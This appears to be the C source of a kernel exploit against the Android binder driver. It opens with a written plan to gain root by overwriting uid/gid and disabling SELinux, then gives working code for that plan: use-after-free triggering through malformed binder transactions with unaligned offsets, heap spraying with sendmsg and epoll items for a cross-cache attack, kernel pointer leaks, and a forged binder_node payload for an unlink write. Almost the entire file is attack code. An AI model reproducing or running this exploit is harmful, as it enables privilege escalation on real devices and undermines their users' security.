#include "binder_client.h"
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "binder.h"
#include "exploit.h"
#include "util.h"
#include "token_manager.h"


// Exploit plan:
// Spray messages back and forth, to get fragmented binder allocator
//   TODO: figure out how to do this
//
// UAF on many binder nodes
//
// Then cross cache attack with epitem
//   allocate 2 epitem per fd, try to leak first one to get leak on file and second epitem
//
// UAF on binder node, reclaim with binder ref referencing another node
//   read dangling message to leak other node
//
// UAF on other node we leaked
//   reclaim with fake msg_msg which will overwrite
//   msg_msg will have linked list setup to unlink overwrite one of file inode pointers to epitem
//
// Now arbitrary read is set up
//   leak file f_ops vtable pointer from known address
//   traverse process list with arb read to find target process
//
// perform unlink setup more times
//   overwrite uid and gid to 0
//   set selinux.enforcing to 0
//
// exec shell

struct list_head { 
    struct list_head *next, *prev; 
}; 

struct hlist_head { 
    struct hlist_node *first; 
}; 

struct hlist_node { 
    struct hlist_node *next, **pprev; 
};

struct rb_node {
    unsigned long  __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

struct binder_work {
    struct list_head entry;

    enum binder_work_type {
        BINDER_WORK_TRANSACTION = 1,
        BINDER_WORK_TRANSACTION_COMPLETE,
        BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT,
        BINDER_WORK_RETURN_ERROR,
        BINDER_WORK_NODE,
        BINDER_WORK_DEAD_BINDER,
        BINDER_WORK_DEAD_BINDER_AND_CLEAR,
        BINDER_WORK_CLEAR_DEATH_NOTIFICATION,
    } type;
};

struct binder_node {
	int debug_id;
	//spinlock_t lock;
    // TODO: figure out if this is correct (should be based on offset of ptr and cookie)
    u32 lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
    // Offset 88 and 96
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		* bitfield elements protected by
		* proc inner_lock
		*/
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		* invariant after initialization
		*/
		u8 sched_policy:2;
		u8 inherit_rt:1;
		u8 accept_fds:1;
		u8 txn_security_ctx:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};


typedef struct {
    // fd for send and receive ends of pipe for sending commands to b
    int send_command_pipe;
    int recv_command_pipe;

    // fd for send and receive ends of pipe for receiving responses from b
    int send_response_pipe;
    int recv_response_pipe;
} CommandPipe;

void command_pipe_init(CommandPipe *command_pipe) {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));

    command_pipe->send_command_pipe = fds[1];
    command_pipe->recv_command_pipe = fds[0];

    SYSCHK(pipe(fds));
    command_pipe->send_response_pipe = fds[1];
    command_pipe->recv_response_pipe = fds[0];
}

typedef struct {
    CommandPipe b_pipe;
    CommandPipe c_pipe;
    CommandPipe d_pipe;

    // token of a
    // b will look in token manager for this token to get a binder reference to a's control node
    struct token a_token;

    // syncronise a and c for after A finishes registering with token manager
    pthread_barrier_t a_register_done;
} ExploitCtx;

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void exploit_ctx_init(ExploitCtx *ctx) {
    memset(ctx, 0, sizeof(ExploitCtx));

    command_pipe_init(&ctx->b_pipe);
    command_pipe_init(&ctx->c_pipe);
    command_pipe_init(&ctx->d_pipe);

    init_shared_barrier(&ctx->a_register_done, 2);
}

typedef enum {
    // b commands
    UAF_NODE,

    // c commands
    RECV_NODE,
    RESET_CONTEXT,
    ACQUIRE_CONTEXT,
    // for prepping binder allocator layout for cross cache
    SEND_EMPTY,
    SEND_NODE,
} CommandType;

typedef struct {
    binder_uintptr_t base_id;
    u64 node_count;
    bool use_async;
} UafNodeArgs;

typedef struct {
    CommandType command_type;
    u32 body_size;
} PipeCommandHeader;

typedef struct {
    PipeCommandHeader header;
    void *data;
} PipeCommand;

void send_pipe_command(CommandPipe *ctx, PipeCommand *command) {
    write(ctx->send_command_pipe, &command->header, sizeof(PipeCommandHeader));
    if (command->data) {
        write(ctx->send_command_pipe, command->data, command->header.body_size);
    }
}

// sends only a command type with no body
void send_pipe_command_type(CommandPipe *ctx, CommandType command_type) {
    PipeCommand command = {
        .header = {
            .command_type = command_type,
            .body_size = 0,
        },
        .data = NULL,
    };

    send_pipe_command(ctx, &command);
}

PipeCommand recv_pipe_command(CommandPipe *ctx) {
    PipeCommand out = { 0 };
    read(ctx->recv_command_pipe, &out.header, sizeof(PipeCommandHeader));

    if (out.header.body_size > 0) {
        out.data = calloc(out.header.body_size, sizeof(u8));
        read(ctx->recv_command_pipe, out.data, out.header.body_size);
    } else {
        out.data = NULL;
    }

    return out;
}

void pipe_command_drop(PipeCommand command) {
    if (command.data) {
        free(command.data);
    }
}

typedef enum {
    COMMAND_OK,
    COMMAND_ERROR,
} PipeCommandResponse;

void send_command_response(CommandPipe *ctx, PipeCommandResponse response) {
    assert(write(ctx->send_response_pipe, &response, sizeof(PipeCommandResponse)) == sizeof(PipeCommandResponse));
}

void await_response(CommandPipe *ctx) {
    PipeCommandResponse response = COMMAND_ERROR;
    read(ctx->recv_response_pipe, &response, sizeof(PipeCommandResponse));
    if (response != COMMAND_OK) {
        panic("Received error response from process B");
    }
}

typedef struct {
    ExploitCtx *ctx;
    binder_client_t binder;
    u32 c_handle;
    // when local context passed to new thread, this instructe new thread id of node to allocate
    binder_uintptr_t allocate_node_id;
} LocalCtx;

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count, bool use_async);
void uaf_flush_read(LocalCtx *ctx, u64 node_count);

#undef PAGE_SIZE
#define PAGE_SIZE (0x1000)

#define PROCESS_A_BINDER 20
#define PROCESS_B_BINDER 40

#define VULN_BINDER 1337

#define SEND_COOKIE 0x69696969

// creates an empty binder reply and sends it
// used to pop message off of transaction stack, so more messages can be sent
void empty_reply(int binder_fd) {
    char read_buf[128] = { 0 };
    usize read_amount = 0;

    struct binder_txn *reply_txn = binder_txn_create(0, 0, 0);
    binder_txn_dispatch(reply_txn, binder_fd, true, NULL, 0, NULL);
    binder_txn_destroy(reply_txn);

    // read transaction complete workqueu item
    binder_read(binder_fd, read_buf, sizeof(read_buf), &read_amount);
    // binder_read_buffer_dump(read_buf, read_amount);
}

// sends a node with the given node number to the recepient process
void send_node(binder_client_t *binder, u32 remote_handle, binder_uintptr_t node_num, bool read_reponse) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, TF_ONE_WAY);
    binder_txn_add_binder_object(txn, node_num, SEND_COOKIE);

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);

    // receive response for transaction (don't do anything with it)
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    if (read_reponse) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        // LOGD("send node buffer dump");
        // binder_read_buffer_dump(read_buf, read_amount);
    }
    // void *thing = NULL;
    // TODO: figure out if there is some transaction buffer we have to free when reading response
    // ret = binder_read_buffer_lookup(read_buf, read_amount, BR_INCREFS, &thing);
    // if (ret == 0) {
    //     binder_increfs_done(binder->fd, node_num, 0x69696969);
    // }

    // ret = binder_read_buffer_lookup(read_buf, read_amount, BR_ACQUIRE, &thing);
    // if (ret == 0) {
    //     binder_acquire_done(binder->fd, node_num, 0x69696969);
    // }
}

// receives a handle to a node
u32 recv_strong_handle(binder_client_t *binder, u64 reply_handle) {
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        // LOGD("recv read");
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        // LOGD("recv after read");
        // binder_read_buffer_dump(read_buf, read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("rev_strong_handle: skipping read result with no transaction");
        } else {
            break;
        }
    }

    // LOGD("recv strong handle, node id: %llu, node cookie: %llu", txn->target.ptr, txn->cookie);

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        // LOGD("header type: %u", object->hdr.type);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);
            binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);

            return handle;
        }
    }

    panic("No handle found");
}

// NOTE: doesn't read reply, because this is used in uaf_nodes, where we don't want to read the reply yet
void send_multiple_nodes(binder_client_t *binder, u32 remote_handle, binder_uintptr_t base_node_num, u32 node_count) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, 0);
    for (usize i = 0; i < node_count; i++) {
        binder_txn_add_binder_object(txn, base_node_num + i, SEND_COOKIE);
    }

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);
}

void recv_multiple_nodes(binder_client_t *binder, u32 *ref_array, u32 node_count) {
    u8 read_buf[1024] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("recv_multiple_nodes: skipping read result with no transaction");
        } else {
            break;
        }
    }

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);
    usize node_index = 0;

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);

            if (node_index >= node_count) {
                panic("recv_multiple_nodes: received too many nodes");
            }
            ref_array[node_index] = handle;
            node_index += 1;
        }
    }

    if (node_index != node_count) {
        panic("recv_multiple_nodes: Did not receive enough nodes");
    }

    binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);
    empty_reply(binder->fd);
}

void allocate_node(LocalCtx *ctx, binder_uintptr_t node_id, bool read_reponse) {
    send_pipe_command_type(&ctx->ctx->c_pipe, RECV_NODE);
    send_node(&ctx->binder, ctx->c_handle, node_id, read_reponse);
    await_response(&ctx->ctx->c_pipe);
}

void reset_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, RESET_CONTEXT);
    await_response(&ctx->ctx->c_pipe);
}

void connect_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, ACQUIRE_CONTEXT);
    ctx->c_handle = recv_strong_handle(&ctx->binder, -1);
    LOGD("A: received C's handle");
    await_response(&ctx->ctx->c_pipe);
}

#define NUM_SPRAY 16

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with 
u8 payload[128] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };


void *spray_thread(void *x) {
    size_t index = (size_t)x;
    write(control_socket[0], dummy_buf, 1);
    read(control_socket[0], dummy_buf, 1);
    pin_to_cpu(0);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    sendmsg(spray_sockets[index][1], &msg, 0);

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    memset(payload, 0, sizeof(payload));
    memset(dummy_buf, 0, sizeof(dummy_buf));

    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
    control_header->cmsg_len = sizeof(payload);
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
}

void do_spray() {
    write(control_socket[1], dummy_buf, NUM_SPRAY);
    // wait for spray to finish
    // cant really use barrier cause threads will indefinately block in sendmsg
    // so they can't signal after they are done
    sleep(1);
}

// cleans up resrouces used during spray
void reset_spray() {
    for (usize i = 0; i < NUM_SPRAY; i++) {
        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
        SYSCHK(close(spray_sockets[i][0]));
        SYSCHK(close(spray_sockets[i][1]));
    }

    SYSCHK(close(control_socket[0]));
    SYSCHK(close(control_socket[1]));
}

void await_thread(void *(*thread_fn)(void *value), void *value) {
    // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
    // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
    pin_to_cpu(1);
    pthread_t thread = 0;
    SYSCHK(pthread_create(&thread, 0, thread_fn, value));
    SYSCHK(pthread_join(thread, NULL));
    pin_to_cpu(0);
}

void detach_thread(void *(*thread_fn)(void *value), void *value) {
    // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
    // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
    pin_to_cpu(1);
    pthread_t thread = 0;
    SYSCHK(pthread_create(&thread, 0, thread_fn, value));
    SYSCHK(pthread_detach(thread));
    pin_to_cpu(0);
}

// allocates node in another thread, so inc ref count work queue item is never processed in main thread
void *allocate_node_thread(void *ctx_void) {
    pin_to_cpu(0);
    LocalCtx *ctx = (LocalCtx *) ctx_void;
    allocate_node(ctx, ctx->allocate_node_id, false);
    return NULL;
}

typedef struct {
    int binder_fd;
    struct binder_txn *txn;
    pthread_barrier_t barrier;
} SyncTxnDispatchData;

void *sync_txn_dispatch_thread(void *sync_msg_data) {
    pin_to_cpu(0);
    SyncTxnDispatchData *data = (SyncTxnDispatchData *) sync_msg_data;

    binder_enter_looper(data->binder_fd);
    binder_txn_dispatch(data->txn, data->binder_fd, false, NULL, 0, NULL);

    pthread_barrier_wait(&data->barrier);

    pin_to_cpu(1);

    // sleep for a while so transaction processes, so other process doesn't get dead reply
    // can't use binder_read cause binder is goofy with multiple threads
    // sleep(10);

    // // wait for transaction to finish
    // u8 read_buf[256] = { 0 };
    // usize read_amount = 0;

    // for (;;) {
    //     binder_read(data->binder_fd, read_buf, sizeof(read_buf), &read_amount);
    //     int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION_COMPLETE, NULL);

    //     if (ret < 0) {
    //         LOGD("sync_txn_dispatch_thread: Skipping result which is not transaction finished");
    //     } else {
    //         break;
    //     }
    // }

    return NULL;
}

// dispatches a syncrhonous transaction on another thread, so it doesn't interfare with transaction stack
void sync_txn_dispatch(int binder_fd, struct binder_txn *txn) {
    SyncTxnDispatchData data = {
        .binder_fd = binder_fd,
        .txn = txn,
    };

    pthread_barrier_init(&data.barrier, NULL, 2);

    detach_thread(sync_txn_dispatch_thread, &data);

    pthread_barrier_wait(&data.barrier);
    pthread_barrier_destroy(&data.barrier);
}

binder_uintptr_t allocate_from_process_c(LocalCtx *ctx, CommandType command) {
    send_pipe_command_type(&ctx->ctx->c_pipe, command);

    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("allocate: skipping read result with no transaction");
        } else {
            break;
        }
    }

    empty_reply(ctx->binder.fd);

    await_response(&ctx->ctx->c_pipe);

    return txn->data.ptr.buffer;
}

binder_uintptr_t allocate_empty(LocalCtx *ctx) {
    return allocate_from_process_c(ctx, SEND_EMPTY);
}

binder_uintptr_t allocate_ref(LocalCtx *ctx) {
    return allocate_from_process_c(ctx, SEND_NODE);
}

bool looks_like_kernel_pointer(usize value) {
    return value > 0xffffff8000000000;
}

#define UAF_PTR 123456789
#define UAF_COOKIE 987654321

#define BUFFER_GAP_COUNT 2000
// Real exploit used these values
#define SPRAY_NODE_COUNT 1600
#define FILE_COUNT 28
#define SPRAY_EPITEM_COUNT (FILE_COUNT * 2)

#define SPRAY_BASE_ID 10000000


void do_a(LocalCtx *ctx) {
    setup_spray();

    u8 read_buf[4096] = { 0 };
    usize read_amount = 0;

    // first arg must just be nonzero, but does nothing
    int epoll_fd = SYSCHK(epoll_create(1));

    // first we get 28 files open
    int files_to_leak[SPRAY_EPITEM_COUNT] = { 0 };
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i += 2) {
        // must dup file descriptor to allow adding multiple epitem to same struct file
        // badspin uses timerfd for epoll, use this because
        // I get permission denied for regular file and /dev/null
        files_to_leak[i] = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
        files_to_leak[i + 1] = SYSCHK(dup(files_to_leak[i]));
    }

    LOGD("Opened file descriptors...");

    // next step is arrange binder allocator to have many gaps which a received node fit in
    binder_uintptr_t ref_bufs_to_free[BUFFER_GAP_COUNT] = { 0 };
    for (usize i = 0; i < BUFFER_GAP_COUNT; i++) {
        ref_bufs_to_free[i] = allocate_empty(ctx);
    }

    LOGD("Allocated from binder allocator...");

    // create the gaps
    for (usize i = 0; i < BUFFER_GAP_COUNT; i++) {
        binder_free_transaction_buffer(ctx->binder.fd, ref_bufs_to_free[i]);
    }

    LOGD("Created gaps in binder allocator...");

    // now spray and uaf many nodes
    // TODO: use async transaction instead of another thread, reduce allocations
    // uaf nodes allocates all the nodes first, then frees them later, so it works how we need
    uaf_nodes(ctx, SPRAY_BASE_ID, SPRAY_NODE_COUNT, true);
    uaf_flush_read(ctx, SPRAY_NODE_COUNT);

    LOGD("UAF nodes done...");

    // reclaim with epoll fds
    struct epoll_event events = {
        // make events not 0 so epoll doesn't ignore
        // idt that is a thing but just in case
        .events = EPOLLIN,
        .data = 0,
    };
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i++) {
        SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_ADD, files_to_leak[i], &events));
    }

    LOGD("Reclaimed with ep_item...");

    bool epitem_found = false;
    usize leak1 = 0;
    usize leak2 = 0;

    for (usize i = 0; i < SPRAY_NODE_COUNT; i++) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        struct binder_transaction_data *response = NULL;
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
        if (ret < 0) {
            panic("Didn't receive response");
        }

        if (response->cookie != SEND_COOKIE) {
            LOGD("got corrupted node");
        }

        // LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

        if (response->cookie != SEND_COOKIE && looks_like_kernel_pointer(response->target.ptr) && looks_like_kernel_pointer(response->cookie)) {
            // memory corruption occured, potential epitem leak
            leak1 = response->target.ptr;
            leak2 = response->cookie;
            epitem_found = true;
            // still need to read rest of messages, so don't break here
        }
    }

    if (!epitem_found) {
        panic("Could not succeed with cross cache attack");
    }

    LOGD("Leaked epitem and file");
    LOGD("leak1: %zu", leak1);
    LOGD("leak2: %zu", leak2);

    return;

    usize leak_addr = 0;
    // fixme: multiple iterations don't work, it will hang second iteration cause B doesn't receive nodes for some reason
    usize iteration = 0;
    for (;;) {
        uaf_nodes(ctx, 1337 + iteration, 1, false);
        uaf_flush_read(ctx, 1);

        // we need to allocate node to reclaim UAF node with ref
        // issue is if we allocate node, when we read in message pointing to freed node to get leak, we will
        // read in message acknowledging refcount incrament, which will put node in state where it can be later UAF
        // this is because this workqueue item goes per thread and the async message goes in a list
        // which is read later (so this refcount message will be read first)
        // so we spawn a new thread to do the work, and the workqueue item will go to that thread
        // and it will never read it, so it is possible to UAF this node later
        ctx->allocate_node_id = 80000 + iteration;
        await_thread(allocate_node_thread, ctx);

        LOGD("================ UAF ================");
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        LOGD("read length: %llu", read_amount);
        binder_read_buffer_dump(read_buf, read_amount);
        struct binder_transaction_data *response = NULL;
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
        if (ret < 0) {
            panic("Didn't receive response");
        }

        LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

        empty_reply(ctx->binder.fd);

        // if target value looks like heap pointer, go next
        if (looks_like_kernel_pointer(response->target.ptr)) {
            leak_addr = response->target.ptr;
            break;
        } else {
            LOGD("retry leak...");
            // avoid allocating excesive amount of nodes
            reset_process_c(ctx);
            connect_process_c(ctx);
            sleep(1);
            // FIXME: retries have -1 refcount for some reason
            // return;
        }

        iteration++;
    }

    binder_uintptr_t leaked_node = 80000 + iteration;
    LOGD("================ LEAK ================");
    LOGD("Got leak on binder node %d: %p\n\n", leaked_node, leak_addr);

    // set up payload to spray
    usize list_offset = offsetof(struct binder_node, work);
    struct binder_node *node = (struct binder_node *) payload;
    // last decrament will free
    node->local_strong_refs = 1;
    node->work.entry.next = leak_addr + list_offset;
    // node->dead_node.next = (struct hlist_node *) 0x69696960;
    // node->dead_node.pprev = (struct hlist_node **) 0x69696900;
    node->dead_node.next = NULL;
    node->dead_node.pprev = (struct hlist_node **) leak_addr;
    node->cookie = UAF_COOKIE;
    node->ptr = UAF_PTR;

    // now uaf the node we know its address
    uaf_nodes(ctx, leaked_node, 1, false);
    reset_process_c(ctx);
    LOGD("A: reset C");
    // binder frees binder proc later using linux workqueue
    // wait for the workqueue item to run to make sure it is free before
    // we read in BR_INCREF and BR_ACQUIRE codes which wil incrament local refcount
    sleep(1);
    // can't read increfs until after node dropped in process c
    uaf_flush_read(ctx, 1);

    // reclaim freed node
    do_spray();

    LOGD("================ UAF2 ================");
    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    LOGD("read length: %llu", read_amount);
    binder_read_buffer_dump(read_buf, read_amount);
    struct binder_transaction_data *response = NULL;
    int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
    if (ret < 0) {
        panic("Didn't receive response");
    }

    LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

    if (response->target.ptr == UAF_PTR && response->cookie == UAF_COOKIE) {
        sleep(1);
        LOGD("Crashing kernel...");
        // triggers unlink primtive (but maybe unreliable?)
        binder_free_transaction_buffer(ctx->binder.fd, response->data.ptr.buffer);
    }
}

void process_a(ExploitCtx *ctx) {
    pin_to_cpu(0);

    LocalCtx local_ctx = { 0 };
    local_ctx.ctx = ctx;
    binder_client_init(&local_ctx.binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(local_ctx.binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        local_ctx.binder.fd,
        token_manager_handle,
        PROCESS_A_BINDER,
        0,
        &ctx->a_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    pthread_barrier_wait(&ctx->a_register_done);

    binder_enter_looper(local_ctx.binder.fd);

    connect_process_c(&local_ctx);

    do_a(&local_ctx);
}

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count, bool use_async) {
    PipeCommand command = { 0 };
    command.header.command_type = UAF_NODE;
    command.header.body_size = sizeof(UafNodeArgs);

    UafNodeArgs *args = calloc(1, sizeof(UafNodeArgs));
    args->base_id = base_id;
    args->node_count = node_count;
    args->use_async = use_async;
    command.data = args;

    send_pipe_command(&ctx->ctx->b_pipe, &command);
    pipe_command_drop(command);

    u32 b_handle = recv_strong_handle(&ctx->binder, -1);

    send_multiple_nodes(&ctx->binder, b_handle, base_id, node_count);

    await_response(&ctx->ctx->b_pipe);

    LOGD("A: got uaf on nodes");
}

// reads out workqueue items which are still in place for uaf nodes
void uaf_flush_read(LocalCtx *ctx, u64 node_count) {
    u8 read_buf[128] = { 0 };
    usize read_amount = 0;

    u64 increfs_count = 0;
    u64 acquire_count = 0;
    u64 tr_complete_count = 0;

    while (increfs_count < node_count || acquire_count < node_count || tr_complete_count < 1) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);

        // cont all 3 seperately
        // it seems it is possible for orders to change, and we need to consume all of them
        acquire_count += binder_read_buffer_count(read_buf, read_amount, BR_ACQUIRE);
        increfs_count += binder_read_buffer_count(read_buf, read_amount, BR_INCREFS);
        tr_complete_count += binder_read_buffer_count(read_buf, read_amount, BR_TRANSACTION_COMPLETE);
    }
}

typedef struct {
    binder_client_t binder;
    u32 a_handle;
    bool active;
} BContext;

void bcontext_deactivate(BContext *bctx) {
    binder_client_destroy(&bctx->binder);
    bctx->active = false;
}

// sets up a connection with a
void acquire_a_handle(ExploitCtx *ctx, BContext *bctx) {
    if (bctx->active) {
        bcontext_deactivate(bctx);
    }

    binder_client_init(&bctx->binder, NULL);
    bctx->active = true;

    u32 token_manager_handle = 0;
    int ret = find_token_manager(bctx->binder.fd, &token_manager_handle);
    if (ret < 0) {
        panic("Failed to create binder client");
    }

    ret = token_manager_lookup(
        bctx->binder.fd,
        token_manager_handle,
        &ctx->a_token,
        &bctx->a_handle
    );
    if (ret < 0) {
        panic("Failed to lookup a binder context");
    }

    binder_enter_looper(bctx->binder.fd);

    // send a node for this process to a
    send_node(&bctx->binder, bctx->a_handle, PROCESS_B_BINDER, true);
}

// process b receives commands from a and does actions
void process_b(ExploitCtx *ctx) {
    pin_to_cpu(0);

    BContext bctx = { 0 };
    bctx.active = false;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        LOGD("B: listening for next command...");
        PipeCommand command = recv_pipe_command(&ctx->b_pipe);

        switch (command.header.command_type) {
            case UAF_NODE: {
                UafNodeArgs *args = (UafNodeArgs *) command.data;
                LOGD("B: got UAF command base id: %llu, count: %lu", args->base_id, args->node_count);

                u32 *refs = calloc(args->node_count, sizeof(u32));
                acquire_a_handle(ctx, &bctx);

                LOGD("B: acquired A handle");

                recv_multiple_nodes(&bctx.binder, refs, args->node_count);

                // TODO: maybe don't receive refs 1 by one, but idt it will mess up exploit
                // for (usize i = 0; i < args->node_count; i++) {
                //     refs[i] = recv_strong_handle(&bctx.binder, bctx.a_handle);
                //     LOGD("B: got ref %u", refs[i]);
                // }

                LOGD("B: received handles");

                u8 read_buf[256] = { 0 };
                usize read_amount = 0;

                // send empty message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    if (args->use_async) {
                        struct binder_txn *message = binder_txn_create(refs[i], 0, TF_ONE_WAY);
                        binder_txn_dispatch(message, bctx.binder.fd, false, NULL, 0, NULL);

                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    } else {
                        struct binder_txn *message = binder_txn_create(refs[i], 0, 0);
                        sync_txn_dispatch(bctx.binder.fd, message);

                        binder_txn_destroy(message);
                    }
                }

                LOGD("B: sent fake messages");

                // send vulnerable message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    for (usize j = 0; j < 1; j++) {
                        struct binder_txn *vuln_message = binder_txn_create(refs[i], 0, TF_ONE_WAY);

                        binder_txn_add_binder_object(vuln_message, args->base_id + i, 0);
                        // make offsets unaligned
                        vuln_message->offsets_size += 1;

                        binder_txn_dispatch(vuln_message, bctx.binder.fd, false, NULL, 0, NULL);
                        binder_txn_destroy(vuln_message);

                        // read error code
                        // allows more errors to be setn in future
                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    }
                }

                LOGD("B: triggered invalid refcount decrament");

                // Idt this is necessary, do cause there were some issues before
